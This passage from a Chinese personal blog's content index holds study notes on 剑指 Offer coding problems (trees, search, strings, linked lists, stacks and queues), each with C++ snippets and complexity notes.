q);if(p-&gt;val &lt; root-&gt;val &amp;&amp; q-&gt;val &lt; root-&gt;val) return lowestCommonAncestor(root-&gt;left, p, q);return root; 复杂度时间复杂度O(n)，若递归，空间复杂度O(n)，改为迭代则空间复杂度O(1) 剑指 Offer 68 - II. 二叉树的最近公共祖先给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。 输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1输出: 3解释: 节点 5 和节点 1 的最近公共祖先是节点 3。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/er-cha-shu-de-zui-jin-gong-gong-zu-xian-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解这题少了二叉搜索树的条件，不能通过大小向一侧递归 但判断公共祖先的条件相同，若两个节点在一个节点的两侧，则该节点是公共节点 依然是向两侧递归查找，结束的条件为： 1、root越过叶节点，未找到 2、root = p 或 root = q ，此时root就是公共祖先 12TreeNode* left = lowestCommonAncestor(root-&gt;left, p, q);TreeNode* right = lowestCommonAncestor(root-&gt;right, p, q); left和right就是在左侧和右侧的公共祖先，当然，只有一个存在（），另一个越过叶节点返回nullptr 若两个if都不执行，说明分居两侧，当前root就是公共祖先。 12345if(left == nullptr) return right;if(right == nullptr) return left;return root; 剑指 Offer 37. 序列化二叉树请实现两个函数，分别用来序列化和反序列化二叉树。 你需要设计一个算法来实现二叉树的序列化与反序列化。这里不限定你的序列 / 反序列化算法执行逻辑，你只需要保证一个二叉树可以被序列化为一个字符串并且将这个字符串反序列化为原始的树结构。 输入：root = [1,2,3,null,null,4,5]输出：[1,2,3,null,null,4,5] 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/xu-lie-hua-er-cha-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解要从序列重建二叉树，需要序列有足够的信息，中间的空节点用#等符号标记。 主要说说层序遍历 1、如何生成序列？与常规层序遍历不同的是，一个子节点是空节点也要入队，当出队的节点是空节点时加上标识#，但不再让它的子节点入队（空节点的子节点没意义）。每个字符后加空格是为了后续输入流做准备。 1234567891011121314while(!q.empty())&#123; //按层加入字符串，null则加入#，直到最后一个节点 TreeNode* cur = q.front(); q.pop(); if(cur != nullptr)&#123; res += to_string(cur -&gt; val); q.push(cur -&gt; left); q.push(cur -&gt; right); &#125; else res += '#'; res += ' ';&#125;while(res.back() == '#') res.pop_back(); 最后会加入一些无用的#，比如 [1,2,3]会加入4个#，所以要把最后一个有效节点之后的#删去。 2、如何重建二叉树？通过上述操作我们得到一个层序遍历的序列，从根节点到最后一个非空节点，其中的空节点用#表示。同样用一个队列依次加入非空节点，用指针i指向序列寻找子节点。 如[1,2,3,#,#,4,5]，节点1入队，i从初始的0后移两次，分别指向2和3，之后节点2入队，指针再移动两次，分别指向2的子节点#和#，再移两次，3的子节点是4和5。 1234567891011121314while(!q.empty())&#123; TreeNode* cur = q.front(); q.pop(); if(i &lt; s.size() &amp;&amp; s[i] != \"#\") cur -&gt; left = new TreeNode(stoi(s[i])); ++i; if(i &lt; s.size() &amp;&amp; s[i] != \"#\") cur -&gt; right = new TreeNode(stoi(s[i])); ++i; if(cur -&gt; left != nullptr) q.push(cur -&gt; left); if(cur -&gt; right != nullptr) q.push(cur -&gt; right);&#125; 复杂度层序遍历，时间复杂度O(n)，需要队列，空间复杂度O(n) 易错点为了方便每次读取字符串的一个字符，本题要用到字符串流操作，学习一下这种方法。 剑指 Offer 38. 字符串的排列输入一个字符串，打印出该字符串中字符的所有排列。 你可以以任意顺序返回这个字符串数组，但里面不能有重复元素。 输入：s = “abc”输出：[“abc”,”acb”,”bac”,”bca”,”cab”,”cba”] 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/zi-fu-chuan-de-pai-lie-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解回溯问题，一般都要用递归。 全排列问题的模板，以及重复元素的剪枝： 12345678910111213141516if(begin == end)&#123; res.push_back(s); return;&#125;for(int i = begin; i &lt;= end; ++i)&#123; //选择i和begin交换 bool flag = false; for(int j = begin; j &lt; i; ++j)&#123; //排除重复元素 if(s[i] == s[j]) flag = true; &#125; if(!flag)&#123; swap(s[i], s[begin]); my_per(s, begin + 1, end); swap(s[i], s[begin]); &#125;&#125; 每次选择固定一个元素i，让后续元素进行交换（从begin+1到end），begin = end时说明只有一个元素无需交换，递归结束。 复杂度每次递归begin后移一位，处理的字符串长度为n、n-1、…1，时间复杂度N！，每个元素都要固定一次，总时间复杂度O(n!n)。递归栈储存n的字符串，空间复杂度O(n) 易错点注意边界和结束条件","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"剑指 Offer. 查找算法","date":"2022-04-19T08:57:18.000Z","path":"2022/04/19/剑指offer-查找算法/","text":"查找算法，包括03. 数组中重复的数字，53 - I. 在排序数组中查找数字 I，53 - II. 0～n-1中缺失的数字，04. 二维数组中的查找，11. 旋转数组的最小数字，50. 第一个只出现一次的字符 剑指 Offer 03. 数组中重复的数字在一个长度为 n 的数组 nums 里的所有数字都在 0～n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字重复了，也不知道每个数字重复了几次。请找出数组中任意一个重复的数字。 输入：[2, 3, 1, 0, 2, 5, 3]输出：2 或 3 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shu-zu-zhong-zhong-fu-de-shu-zi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、笨方法：两层for直接遍历，复杂度O(n^2) 2、排序：先快排，有序后遍历一次即可，复杂度O(nlogn+n)，但是会改变原数组顺序 3、哈希表：将数组元素值对应辅助数组下标，查找到后使辅助数组值+1，若查找时辅助数组值已经为1，说明有重复元素，需辅助空间 4、字典：建立索引和值之间的映射，不断交换索引和值，直到索引和值成功匹配，或者发现重复值 123if(nums[nums[i]]==nums[i]) //建立映射时出现重复，得到结果 return nums[i];swap(nums[nums[i]],nums[i]); //交换后再找新的映射 复杂度法3时间复杂度O(n)，空间复杂度O(n) 法4时间复杂度O(n)，空间复杂度O(1) 易错点一开始模糊地记得字典方法的交换思路，但模拟下来发现有问题。原因是每次选定一个索引，然后不断重复交换看是否匹配，若nums[i]=i，说明映射已建立，这时才移到下一个索引，否则一直交换，直到找到重复元素则退出函数。 剑指 Offer 53 - I. 在排序数组中查找数字 I统计一个数字在排序数组中出现的次数。 输入: nums = [5,7,7,8,8,10], target = 8输出: 2 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/zai-pai-xu-shu-zu-zhong-cha-zhao-shu-zi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、直接搜索，未利用有序的条件 2、在有序数组中将复杂度降到O(n)以下，很容易想到二分思想。此题重点在于边界处理 有两点值得注意，一是while的边界左右重合时依然要进入while，因为此时可能i，j处就是target，需要再来一次i=m+1移动到右边。 ​ 二是num[m]=target时不能像普通二分那样退出，我们要找的是右边界，找到target也要接着划分更小的区间 12345678while(i&lt;=j) //找右端边界&#123; m=(i+j)/2; if(nums[m]&lt;=target) i=m+1; else j=m-1;&#125; 复杂度时间复杂度O(logn)，空间复杂度O(1) 剑指 Offer 53 - II. 0～n-1中缺失的数字一个长度为n-1的递增排序数组中的所有数字都是唯一的，并且每个数字都在范围0～n-1之内。在范围0～n-1内的n个数字中有且只有一个数字不在该数组中，请找出这个数字。 输入: [0,1,3]输出: 2 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/que-shi-de-shu-zi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解有序数组的查找，复杂度要降至O(n)一下，想到二分法。 首先考虑常规二分法查找一个不存在的元素的情况，如[0,1,2,4,5]中找3 左右边界i，j的变化为0 4-&gt;3 4-&gt;3 2 然后跳出，可以发现缺失元素就在a[i],a[j]之间，由于从0开始，所以缺失数字就是i。类似此思路，本题二分查找后判断nums[mid]和mid的大小： 若相等，说明mid之前都有序，缺失的数在后面的序列，令left=mid+1 若不相等，也就是nums[mid]&gt;mid，缺失的数在前面的序列，令right=mid-1 最终跳出循环后，left就是所求的缺失数 12345m=(l+r)/2;if(nums[m]&gt;m) r=m-1;else l=m+1; 复杂度时间复杂度O(logn)，空间复杂度O(1) 易错点1、二分法while的条件，若起始left=0，right=size-1，那么条件为left&lt;=right（带等号），当left=right+1出现异常，但此时已满足跳出条件，不会影响结果。 2、其他边界问题举例分析，注意区分索引和值 剑指 Offer 04. 二维数组中的查找在一个 n * m 的二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个高效的函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 [ [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30]] 5 true 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/er-wei-shu-zu-zhong-de-cha-zhao-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、每行为单位，分别进行二分查找 2、斜着看，每个节点都是一棵二叉搜索树的根，左移变小、下移变大。可从右上方节点开始，比较矩阵元素和target的大小，并进行行或列的移动。 123456if(matrix[i][j]==target) return true;if(matrix[i][j]&gt;target) //列指针向左移动 j--;else //行指针向下移动 i++; 复杂度行最多移动n次，列最多移动m次，时间复杂度O(n+m)，空间复杂度O(1) 易错点起初把矩阵当作上下三角矩阵（这样才有树状:&gt;）分别查找，但其实没必要，因为每个节点都符合左小下大的特点，都是二叉查找树的根，不需要做区分。 还有就是边界问题，上面代码里的else不能改if(matrix&lt;target)，因为j–后再判断这个if可能越界，用else可避免二次if，这算是一种effective c的技巧吧。i，j需要同时考虑上下界，上界为行/列最大值，下界为0 剑指 Offer 11. 旋转数组的最小数字把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。 给你一个可能存在 重复 元素值的数组 numbers ，它原来是一个升序排列的数组，并按上述情形进行了一次旋转。请返回旋转数组的最小元素。例如，数组 [3,4,5,1,2] 为 [1,2,3,4,5] 的一次旋转，该数组的最小值为 1。 输入：numbers = [3,4,5,1,2]输出：1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/xuan-zhuan-shu-zu-de-zui-xiao-shu-zi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解部分有序数组找最小值，还是二分法 这种旋转数组有一个重要的特点，最小值左侧的序列&gt;=最右侧的值，最小值右侧的序列&lt;=最右侧的值 利用此特性，二分后根据nums[mid]和nums[right]的比较可以判断最小值在左侧还是右侧， 若二者相等，则right左侧至少有一个元素等于nums[right]，我们用这个元素代替right，即令right-1，缩小区间 123456if(numbers[m]&gt;numbers[r]) //numbers[m]一定不是最小值 l=m+1;else if(numbers[m]&lt;numbers[r]) //numbers[m]可能是最小值 r=m;else --r; 复杂度时间复杂度O(logn)，空间复杂度O(1) 易错点为什么r=m而不是r=m-1？因为r=m-1可能跳过最小值，如[3,1,2]。需要知道numbers[m]&lt;numbers[r]时，这个numbers[m]可能就是要找的最小值，不能跳过它，但第一个if中numbers[m]&gt;numbers[r]就可以知道numbers[m]一定不是最小值，所有l=m+1跳过它。 剑指 Offer 50. 第一个只出现一次的字符在字符串 s 中找出第一个只出现一次的字符。如果没有，返回一个单空格。 s 只包含小写字母。 输入：s = “abaccdeff”输出：’b’ 在字符串 s 中找出第一个只出现一次的字符。如果没有，返回一个单空格。 s 只包含小写字母。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/di-yi-ge-zhi-chu-xian-yi-ci-de-zi-fu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解建立哈希表存储每个字符出现的次数即可 复杂度时间复杂度O(n)，空间复杂度O(m)，m&lt;=26","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"剑指 Offer. 字符串","date":"2022-04-18T09:31:21.000Z","path":"2022/04/18/剑指offer-字符串/","text":"字符串，包括05. 替换空格，58 - II. 左旋转字符串，20. 表示数值的字符串，67. 把字符串转换成整数 剑指 Offer 05. 替换空格请实现一个函数，把字符串 s 中的每个空格替换成”%20”。 示例 1： 输入：s = “We are happy.”输出：”We%20are%20happy.” 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解起初没看懂想要干嘛，直接用replace替换了。 本题原意应该是将字符串中1个字符替换为3个字符，遍历一次，将原字符串的字符依次加入空字符串，若遇到空格则加入%、2、0三个字符。 复杂度时间复杂度O(n)，空间复杂度O(n) 剑指 Offer 58 - II. 左旋转字符串字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。请定义一个函数实现字符串左旋转操作的功能。比如，输入字符串”abcdefg”和数字2，该函数将返回左旋转两位得到的结果”cdefgab”。 输入: s = “abcdefg”, k = 2输出: “cdefgab” 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解最直接的思路：暂存前n个字符，去除原串的前n个字符，再从后面接上。 也可以用substr来拼接，还一种巧妙的思路是3次反转，此方法在408中见过： abcde，2：先ab-&gt;ba ，再cde-&gt;edc，再整体baedc-&gt;cdeba 复杂度时间O(n)，空间O(n) 剑指 Offer 20. 表示数值的字符串请实现一个函数用来判断字符串是否表示数值（包括整数和小数）。 数值（按顺序）可以分成以下几个部分： 若干空格一个 小数 或者 整数（可选）一个 ‘e’ 或 ‘E’ ，后面跟着一个 整数若干空格小数（按顺序）可以分成以下几个部分： （可选）一个符号字符（’+’ 或 ‘-‘）下述格式之一：至少一位数字，后面跟着一个点 ‘.’至少一位数字，后面跟着一个点 ‘.’ ，后面再跟着至少一位数字一个点 ‘.’ ，后面跟着至少一位数字整数（按顺序）可以分成以下几个部分： （可选）一个符号字符（’+’ 或 ‘-‘）至少一位数字部分数值列举如下： [“+100”, “5e2”, “-123”, “3.1416”, “-1E-16”, “0123”]部分非数值列举如下： [“12e”, “1a3.14”, “1.2.3”, “+-5”, “12e+5.4”] 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/biao-shi-shu-zhi-de-zi-fu-chuan-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解本题难在归纳各种情况。 首先是两个分隔符号：.和e，这两个符号的两侧都要接数，但有所不同 . 的前面接整数，e的前面接整数或小数，e前面可以出现 . 所以先判断.再判断e， . 的后面接无符号数，e的后面也接无符号数 然后是空格的判断，前后空格可不计，但数之间不能有空格。 由于前后都要判断数，先写一个判断数的函数，有符号数多加一句判断+-号即可 这里判断的方法是看s[idx]是否在0,9之间，是的话向后移动，判断是否是一个数的问题转化为idx是否移动 1234int tmp = idx;while(idx &lt; s.size() &amp;&amp; s[idx] &gt;= '0' &amp;&amp; s[idx] =&lt; '9') ++idx;return idx &gt; tmp; 先判断.或e之前是否为一个数，若碰到 . 判断它后面是否为无符号数 注意这里用的是||，因为.前面或后面可以有一个为空，即.123 和 123. 都正确，有一边是数即可 12345bool num = isInteger(s, i);if(s[i] == '.')&#123; ++i; num = isUnsignedInt(s, i) || num;&#125; 然后判断e或E，此处用&amp;&amp;，因为e两侧都要有数，且前面是整数或小数，后面必须是整数，都不能为空。 1234if(s[i] == 'e' || s[i] == 'E')&#123; ++i; num = isInteger(s, i) &amp;&amp; num;&#125; 至此数的判断就完成了，为了防止后面再出现空格以外的异常字符，再做一个判断 123while(s[i] == ' ') ++i;return num &amp;&amp; i == s.size(); 复杂度遍历一次字符串，时间复杂度O(n)，空间复杂度O(1) 剑指 Offer 67. 把字符串转换成整数写一个函数 StrToInt，实现把字符串转换成整数这个功能。不能使用 atoi 或者其他类似的库函数。 首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。 当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。 该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。 注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。 在任何情况下，若函数不能进行有效的转换时，请返回 0。 说明： 假设我们的环境只能存储 32 位大小的有符号整数，那么其数值范围为 [−231, 231 − 1]。如果数值超过这个范围，请返回 INT_MAX (231 − 1) 或 INT_MIN (−231) 。 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/ba-zi-fu-chuan-zhuan-huan-cheng-zheng-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解根据题意，大概要分为几步：去空格，判断是否能转化以及符号，转化为数字 1、去空格简单，while找到第一个非空即可 2、判断第一个非空字符，有几种情况：正负号（储存后进行下一步），数字（后移进行下一步），其他（即非法字符，返回0） 3、后面的就是数字串了，使用str[i] - ‘0’ 转为数字，然后res加上或减去该结果。另外别忘了越过边界直接返回。 123456789101112 double res = 0;while(str[i] &gt;= '0' &amp;&amp; str[i] &lt;= '9')&#123; if(flag) res = res * 10 - (str[i] - '0'); else res = res * 10 + (str[i] - '0'); ++i; if(res &gt; INT_MAX) return INT_MAX; if(res &lt; INT_MIN) return INT_MIN; &#125; 复杂度时间复杂度O(n)，空间复杂度O(1) 易错点第一次做时用num存储数字串，浪费空间，完全没必要。要养成意识，能在原字符串上操作就不新开字符串。 而且没想到数字字符到数字的转化方法，写了个函数用switch转，实在麻烦……但不知什么原因，可能是用判断代替了运算，执行速度更快（0ms）","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"剑指 Offer. 链表","date":"2022-04-17T09:38:32.000Z","path":"2022/04/17/剑指offer-链表/","text":"链表，包括06. 从尾到头打印链表，24. 反转链表，35. 复杂链表的复制 剑指 Offer 06. 从尾到头打印链表输入一个链表的头节点，从尾到头反过来返回每个节点的值（用数组返回）。 输入：head = [1,3,2]输出：[2,3,1] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/cong-wei-dao-tou-da-yin-lian-biao-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解逆序问题很容易想到栈，先把结点值入栈，再出栈输出到数组中即可。 另外可以通过递归隐式地使用栈。 复杂度时间复杂度O(n)，空间复杂度O(n) 剑指 Offer 24. 反转链表定义一个函数，输入一个链表的头节点，反转该链表并输出反转后链表的头节点。 示例: 输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL输出: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/fan-zhuan-lian-biao-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解经典题目，一种方法是尾插法，遍历每个结点，依次插入到新链表的尾部。 二是用递归，对于 A-&gt;B&lt;-C，在A令A-&gt;next-&gt;next=A，可使A，B反转。 复杂度时间复杂度为O(n)，迭代法不需额外空间，递归需n的栈。 剑指 Offer 35. 复杂链表的复制请实现 copyRandomList 函数，复制一个复杂链表。在复杂链表中，每个节点除了有一个 next 指针指向下一个节点，还有一个 random 指针指向链表中的任意节点或者 null。 输入：head = [[7,null],[13,0],[11,4],[10,2],[1,0]]输出：[[7,null],[13,0],[11,4],[10,2],[1,0]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/fu-za-lian-biao-de-fu-zhi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解本题难点在于random指针的拷贝，有两种方法 1、直接建立新链表，依据原链表节点之间的关系，在新链表中确定指针的指向，原-&gt;新的映射关系通过哈希表来实现。于是我们首先建立原链表到新链表每个节点之间的哈希映射关系，然后遍历原链表，将原链表指针的指向转为新链表指针的指向。 12cachedNode[cur]-&gt;next=cacheNode[cur-&gt;next];cachedNode[cur]-&gt;radom=cachedNode[cur-&gt;random]; 2、建立新旧链表的拼接即：原节点 1 -&gt; 新节点 1 -&gt; 原节点 2 -&gt; 新节点 2，这样做的好处是隐含了next指针的还原，找到原random后，往后移一次就是新链表节点的random，完成random还原后再拆分链表。 1cur-&gt;next-&gt;random=cur-&gt;random-&gt;next; 复杂度1、遍历一次链表，时间复杂度O(n)，需哈希表，空间复杂度O(n) 2、遍历一次链表，时间复杂度O(n)，原地工作，2n空间，空间复杂度O(n)","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"剑指 Offer. 栈与队列","date":"2022-04-16T03:46:00.000Z","path":"2022/04/16/剑指offer-栈与队列/","text":"栈与队列，包括09. 用两个栈实现队列，30. 包含min函数的栈，59 - I. 滑动窗口的最大值，59 - II. 队列的最大值 剑指 Offer 09. 用两个栈实现队列用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 ) 输入： [“CQueue”,”appendTail”,”deleteHead”,”deleteHead”][[],[3],[],[]]输出：[null,null,3,-1] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解​ 队列是FIFO类型的，而栈是FILO类型的。栈对入栈元素的顺序做一次反转，分别进入两个栈则二次反转变为一个队列。 ​ 设置stack_1为输入栈，stack_2为输出栈。 ​ appendTail时元素在stack_1入栈即可。 ​ 1、deleteHead时先判断stack_2是否有元素，有的话直接出栈； ​ 2、否则查看stack_1是否为空，stack_1空说明整个队列都没有元素了，返回-1； ​ 3、stack_1非空说明上一批入队的元素还在，全部移入stack_2后再删除栈顶元素。 复杂度时间复杂度：appendTail为O(1)，deleteHead为O(1)，平均每个元素进出各一次 空间复杂度：两个栈共O(n) 易错点​ 第一次做时未判断stack_2的是否为空，直接把stack_1的元素移到stack_2了。stack_2非空又移入stack_1会破坏原本顺序，故首先需判断stack_2是否为空。 剑指 Offer 30. 包含min函数的栈定义栈的数据结构，请在该类型中实现一个能够得到栈的最小元素的 min 函数在该栈中，调用 min、push 及 pop 的时间复杂度都是 O(1)。 MinStack minStack = new MinStack();minStack.push(-2);minStack.push(0);minStack.push(-3);minStack.min(); –&gt; 返回 -3.minStack.pop();minStack.top(); –&gt; 返回 0.minStack.min(); –&gt; 返回 -2. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/bao-han-minhan-shu-de-zhan-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解本题难点是以O(1)的复杂度找到栈的最小值。 1、首先想到的是用一个数min暂存最小值，每次入栈比较更新min。这样的问题是若某次pop了最小值，以后就无法再找新的最小值了。因此不能用一个数来存最小值，而应该用一个栈来存，每次把当前最小值压入辅助栈，这样即使上一个最小值已经出栈，也能找到剩下元素的最小值。 2、另一种做法是将当前最小值随元素一起入栈，每次出栈时更新最小值，这样不需辅助栈，只用一个min存储最小值，但内存消耗较多。 复杂度时间复杂度O(1)，空间复杂度O(n)，一个辅助栈 易错点12345678void push(int x) &#123; st.push(x); if(st_min.empty()) st_min.push(x); else if(x&lt;=st_min.top()) //x（也）是最小值，入min栈保存 st_min.push(x);&#125; else if容易漏掉等号，最小值需重复保存，否则也会丢失后续的最小值。 剑指 Offer 59 - I. 滑动窗口的最大值给定一个数组 nums 和滑动窗口的大小 k，请找出所有滑动窗口里的最大值。 输入: nums = [1,3,-1,-3,5,3,6,7], 和 k = 3输出: [3,3,5,5,6,7]解释: 滑动窗口的位置 最大值 [1 3 -1] -3 5 3 6 7 3 1 [3 -1 -3] 5 3 6 7 3 1 3 [-1 -3 5] 3 6 7 5 1 3 -1 [-3 5 3] 6 7 5 1 3 -1 -3 [5 3 6] 7 6 1 3 -1 -3 5 [3 6 7] 7 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/hua-dong-chuang-kou-de-zui-da-zhi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、暴力滑窗，在每个大小为k的窗口中找最大值。 2、包含了很多重复比较，可以设想出一种优化：用一个数据结构存储上个窗口的最大值，这样每次只需有一次比较就能找到当前最大值。 单调队列deque符合需求，设定左右边界i，j，其中j从nums[0]开始 每次把nums[j]入队，为了保持单调性（从大到小），先把deque中比nums[j]小的元素出队 同时检查队列中最大值deque[0]是否是上一个窗口的左边界（即本次滑动后移出窗口的元素），若是的话要出队 12345if(i &gt; 0 &amp;&amp; dq.front() == nums[i - 1]) //删除不在窗口的左端元素 dq.pop_front();while(!dq.empty() &amp;&amp; dq.back() &lt; nums[j]) //保持队列单调性 dq.pop_back();dq.push_back(nums[j]); 整体的思路很像”包含min的栈“，都是用一个数据结构维护可用的最大值序列。 复杂度时间复杂度O(n)，队列每次加入一个数且最少删除一个数，最大为k，空间复杂度O(k) 易错点1、加入结果需要左边界到num[0]才开始，否则有重复 12if(i &gt;= 0) //形成窗口后开始加入队列的最大值 res.push_back(dq[0]); 2、删除不在窗口的左端元素是从nums[1]开始 剑指 Offer 59 - II. 队列的最大值请定义一个队列并实现函数 max_value 得到队列里的最大值，要求函数max_value、push_back 和 pop_front 的均摊时间复杂度都是O(1)。 若队列为空，pop_front 和 max_value 需要返回 -1 输入:[“MaxQueue”,”push_back”,”push_back”,”max_value”,”pop_front”,”max_value”][[],[1],[2],[],[],[]]输出: [null,null,null,2,1,2] 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/dui-lie-de-zui-da-zhi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解和包含min函数的栈几乎一样，只是用的数据结构不同。 min栈用单调栈，max队列用单调队列 和上一题保持单调性的方法一样：从尾部删除小元素，再把当前元素入队 123while(!dq.empty() &amp;&amp; dq.back() &lt;= value) //保持单调性 dq.pop_back();dq.push_back(value); 输出dq.front()就是最大值 复杂度时间复杂度O(1)，空间复杂度O(n) 易错点一开始直接用单调栈来做了，栈和队列pop的顺序不同，原本是什么数据结构就要用对应的单调数据结构。","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"从零到无穷大","date":"2022-04-14T11:10:16.000Z","path":"2022/04/14/从零到无穷大/","text":"读研了，重新开始这个博客。","comments":true,"tags":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/tags/随笔/"}]}]